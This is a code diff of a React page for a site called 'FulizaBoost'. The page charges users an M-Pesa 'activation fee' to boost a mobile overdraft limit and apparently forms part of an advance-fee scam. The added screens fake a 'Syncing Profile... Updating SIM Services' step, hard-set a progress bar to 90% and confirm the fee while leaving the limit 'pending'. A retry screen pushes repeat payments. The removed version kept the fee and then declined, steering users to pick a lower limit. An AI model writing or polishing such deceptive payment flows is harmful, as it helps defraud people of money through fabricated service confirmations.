+                 <div className="bg-white p-8 rounded-xl shadow-2xl border border-slate-50 relative overflow-hidden">
+                    <div className="w-24 h-24 bg-blue-50 rounded-full flex items-center justify-center mx-auto mb-6 relative">
+                        <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-blue-400 opacity-20"></span>
+                        <Smartphone className="w-10 h-10 text-blue-600 relative z-10" />
                     </div>
-                  
-                    <h2 className="text-2xl font-black text-slate-900 mb-2">Check Your Phone</h2>
-                    <p className="text-slate-500 font-medium mb-6 text-sm">
-                        Enter M-Pesa PIN to pay fee of <br/>
-                        <strong className="text-emerald-600 text-xl">KES {selectedOffer.fee}</strong>.
+                    
+                    <h2 className="text-xl font-black text-slate-900 mb-2">Check Your Phone</h2>
+                    <p className="text-slate-500 font-medium mb-6 leading-relaxed text-sm">
+                        Enter PIN to pay <span className="text-blue-600 font-bold">KES {selectedOffer.fee}</span> to activate your KES {selectedOffer.amount.toLocaleString()} limit.
                     </p>
 
-                    <div className="bg-slate-50 rounded-xl p-4 mb-6">
-                        <div className="flex justify-between items-center mb-2">
-                            <span className="text-[10px] font-bold text-slate-400 uppercase">Status</span>
-                            <span className="text-[10px] font-bold text-emerald-600 bg-emerald-100 px-2 py-0.5 rounded animate-pulse">Waiting Payment</span>
+                    <div className="bg-slate-50 rounded-xl p-4 border border-slate-100">
+                        <div className="flex justify-between items-center mb-3">
+                            <span className="text-[10px] font-bold text-slate-400 uppercase tracking-wide">Status</span>
+                            <span className="text-[10px] font-bold text-blue-600 bg-blue-100 px-3 py-1 rounded-full animate-pulse">
+                                {pollMessage}
+                            </span>
                         </div>
                         <div className="w-full bg-slate-200 rounded-full h-2 overflow-hidden">
-                            <div className="h-full bg-emerald-500 animate-[width_5s_ease-in-out_forwards]" style={{width: '0%'}}></div>
+                            <div className="h-full bg-blue-500 animate-[width_15s_ease-in-out_forwards]" style={{width: '90%'}}></div>
                         </div>
-                    </div>
-
-                    <div className="text-[10px] font-bold text-slate-400 uppercase tracking-wide">
-                        Do not close this window
                     </div>
                 </div>
-            </div>
+             </div>
         )}
 
-        {/* ==========================================
-            VIEW 4: RESULT (Approved or Soft Decline)
-           ========================================== */}
-        {currentStep === 'result' && (
-            <div className="max-w-md mx-auto pt-8 animate-in zoom-in-95 duration-500">
+        {/* STEP 6: SYNCING (Transition) */}
+        {step === 'syncing' && (
+             <div className="pt-20 text-center space-y-6 animate-in fade-in duration-700">
+                 <Server className="w-16 h-16 text-blue-600 mx-auto animate-pulse" />
+                 <h2 className="text-2xl font-black text-slate-900">Syncing Profile...</h2>
+                 <p className="text-slate-500 font-medium">Updating SIM Services with new limit.</p>
+             </div>
+        )}
+
+        {/* STEP 7: SUCCESS */}
+        {step === 'success' && selectedOffer && (
+             <div className="text-center pt-8 animate-in zoom-in-95 duration-500">
+                <div className="w-20 h-20 bg-emerald-100 rounded-full flex items-center justify-center mx-auto mb-6">
+                    <CheckCircle2 className="w-10 h-10 text-emerald-600" />
+                </div>
                 
-                {/* SCENARIO A: 5,000 LIMIT (SUCCESS) */}
-                {resultStatus === 'approved' && (
-                    <div className="bg-white p-8 rounded-[2.5rem] shadow-2xl shadow-blue-100 border border-slate-50 text-center">
-                        <div className="w-20 h-20 bg-emerald-100 rounded-full flex items-center justify-center mx-auto mb-6">
-                            <CheckCircle2 className="w-10 h-10 text-emerald-600" />
+                <h2 className="text-2xl font-black text-slate-900 mb-2">Fee Received!</h2>
+                <p className="text-slate-500 font-medium mb-8 px-4 text-sm leading-relaxed">
+                    Your request to boost to <span className="text-slate-900 font-bold">KES {selectedOffer.amount.toLocaleString()}</span> has been queued.
+                </p>
+                
+                <div className="bg-white p-6 rounded-xl shadow-lg border border-slate-100 text-left mb-6 space-y-5">
+                    <div className="flex gap-4">
+                        <div className="w-8 h-8 bg-emerald-500 text-white rounded-full flex items-center justify-center font-bold text-sm shrink-0">1</div>
+                        <div>
+                            <h4 className="font-bold text-slate-900 text-sm">Payment Verified</h4>
+                            <p className="text-xs text-slate-500 mt-0.5">Activation fee received successfully.</p>
                         </div>
-                    
-                        <h2 className="text-3xl font-black text-slate-900 mb-2">Application Received</h2>
-                        <p className="text-slate-500 font-medium mb-8 text-sm">
-                            Your request for <strong className="text-slate-900">KES 5,000</strong> is under review.
-                        </p>
-
-                        <div className="bg-blue-50 border border-blue-100 p-4 rounded-xl text-left flex gap-3 mb-6">
-                            <Clock className="w-5 h-5 text-blue-600 shrink-0" />
-                            <div>
-                                <h4 className="font-bold text-blue-900 text-sm">Status: Under Review</h4>
-                                <p className="text-xs text-blue-700 mt-1">
-                                    Please allow up to 48 hours for your limit to reflect. You will receive an SMS confirmation.
-                                </p>
-                            </div>
-                        </div>
-
-                        <Button 
-                            onClick={() => router.push('/')}
-                            className="w-full h-14 bg-slate-900 hover:bg-slate-800 text-white font-black rounded-xl shadow-xl transition-all"
-                        >
-                            Return to Home
-                        </Button>
                     </div>
-                )}
-
-                {/* SCENARIO B: > 5,000 LIMIT (SOFT DECLINE) */}
-                {resultStatus === 'soft_decline' && (
-                    <div className="bg-white p-8 rounded-[2.5rem] shadow-2xl shadow-orange-100 border border-slate-50 text-center">
-                        <div className="w-20 h-20 bg-orange-100 rounded-full flex items-center justify-center mx-auto mb-6">
-                            <AlertCircle className="w-10 h-10 text-orange-600" />
-                        </div>
-                    
-                        <h2 className="text-2xl font-black text-slate-900 mb-2">Limit Verification Failed</h2>
-                        <p className="text-slate-500 font-medium mb-6 text-sm">
-                            We received your fee, but your current transaction history does not qualify for the requested limit of <strong>KES {selectedOffer.amount.toLocaleString()}</strong> at this time.
-                        </p>
-
-                        <div className="bg-slate-50 p-4 rounded-xl text-left text-sm text-slate-600 mb-6">
-                            <p className="mb-2 text-xs font-bold uppercase text-slate-400">Recommendation</p>
-                            <p className="text-xs font-medium leading-relaxed">
-                                Please try applying for a <strong>lower limit</strong>. Approvals for lower amounts have a significantly higher success rate based on your profile.
+                    <div className="flex gap-4">
+                        <div className="w-8 h-8 bg-blue-500 text-white rounded-full flex items-center justify-center font-bold text-sm shrink-0">2</div>
+                        <div>
+                            <h4 className="font-bold text-slate-900 text-sm">Limit Update Pending</h4>
+                            <p className="text-xs text-slate-500 mt-0.5 leading-relaxed">
+                                System is reviewing your history. New limit will reflect in <span className="text-blue-600 font-bold">1 - 24 hours</span>.
                             </p>
                         </div>
-
-                        <div className="space-y-3">
-                            <Button 
-                                onClick={() => {
-                                    setCurrentStep('grid'); // Go back to grid
-                                    window.scrollTo({ top: 0, behavior: 'smooth' });
-                                }}
-                                className="w-full h-14 bg-emerald-500 hover:bg-emerald-400 text-white font-bold rounded-xl shadow-lg flex items-center justify-center gap-2"
-                            >
-                                <RotateCcw className="w-4 h-4" />
-                                Select Lower Limit
-                            </Button>
-                            <Button 
-                                onClick={() => router.push('/')}
-                                variant="ghost"
-                                className="w-full h-12 text-slate-500 font-bold"
-                            >
-                                Cancel
-                            </Button>
-                        </div>
                     </div>
-                )}
-            </div>
+                     <div className="pt-4 border-t border-slate-50">
+                        <p className="text-[10px] text-slate-400 uppercase font-bold mb-2 tracking-wide text-center">Tracking ID</p>
+                        <div className="font-mono text-sm font-bold text-slate-700 bg-slate-100 p-3 rounded-xl text-center select-all border border-slate-200">
+                            {trackingId}
+                        </div>
+                     </div>
+                </div>
+
+                <Button onClick={() => router.push('/')} className="w-full h-14 bg-slate-900 hover:bg-slate-800 text-white font-bold rounded-xl shadow-lg">
+                    Return Home
+                </Button>
+             </div>
+        )}
+
+        {/* STEP 8: FAILED */}
+        {step === 'failed' && selectedOffer && (
+             <div className="text-center pt-8 animate-in zoom-in-95 duration-500">
+                 <div className="w-20 h-20 bg-orange-50 rounded-full flex items-center justify-center mx-auto mb-6">
+                    <XCircle className="w-10 h-10 text-orange-500" />
+                </div>
+                
+                <h2 className="text-2xl font-black text-slate-900 mb-2">Payment Failed</h2>
+                <p className="text-slate-500 font-medium mb-6 px-4 text-sm leading-relaxed">
+                    We could not verify the fee of <span className="font-bold text-slate-900">KES {selectedOffer.fee}</span>. Limit activation cannot proceed without it.
+                </p>
+                
+                <div className="bg-white p-6 rounded-xl shadow-lg border border-slate-100 mb-6">
+                    <p className="text-xs text-slate-500 font-medium mb-6">
+                        Your pre-approval for <span className="font-bold text-slate-900">KES {selectedOffer.amount.toLocaleString()}</span> is saved for 2 hours.
+                    </p>
+                    <div className="flex flex-col gap-3">
+                        <Button 
+                            onClick={() => setStep('summary')}
+                            className="w-full h-12 bg-blue-600 hover:bg-blue-500 text-white font-bold rounded-xl flex items-center justify-center gap-2"
+                        >
+                            <RefreshCcw className="w-4 h-4" /> Retry Payment
+                        </Button>
+                        <button onClick={() => setStep('offers')} className="text-xs font-bold text-slate-400 hover:text-slate-600 py-3">
+                            Select Lower Limit
+                        </button>
+                    </div>
+                </div>
+             </div>
         )}
 
       </main>
-
-      {/* --- FOOTER --- */}
-      <footer className="py-12 border-t border-slate-100 mt-12 bg-slate-50">
-        <div className="max-w-6xl mx-auto px-4 text-center">
-          <p className="text-xs font-bold text-slate-400 mb-4">© {currentYear} FulizaBoost</p>
-          <div className="flex items-center justify-center gap-6 text-xs font-medium text-slate-500">
-            <span className="hover:text-blue-600 cursor-pointer transition-colors">Privacy</span>
-            <span className="hover:text-blue-600 cursor-pointer transition-colors">Terms</span>
-            <span className="hover:text-blue-600 cursor-pointer transition-colors">Help</span>
-          </div>
-        </div>
-      </footer>
     </div>
   );
 }
